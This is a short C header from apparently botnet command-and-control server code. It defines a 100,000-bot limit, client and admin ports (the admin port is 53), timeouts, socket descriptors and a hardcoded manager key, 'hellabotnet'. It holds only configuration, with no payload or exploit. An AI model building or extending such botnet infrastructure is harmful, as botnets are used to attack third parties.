#pragma once

#include <stdint.h>

#include "def.h"

enum
{
    TRUE = 1,
    FALSE = 0,
    MAX_BOTS = 	100000,
    TIMEOUT = 900,
    VERIFY_TIMEOUT = 10,
    ADMIN_TIMEOUT = 10,
    CLIENT_PORT = 2006,
    ADMIN_PORT = 53
};

static int client_fd = -1;
static int admin_fd = -1;
static int efd = -1;

#define MANAGER_AUTH_KEY "hellabotnet"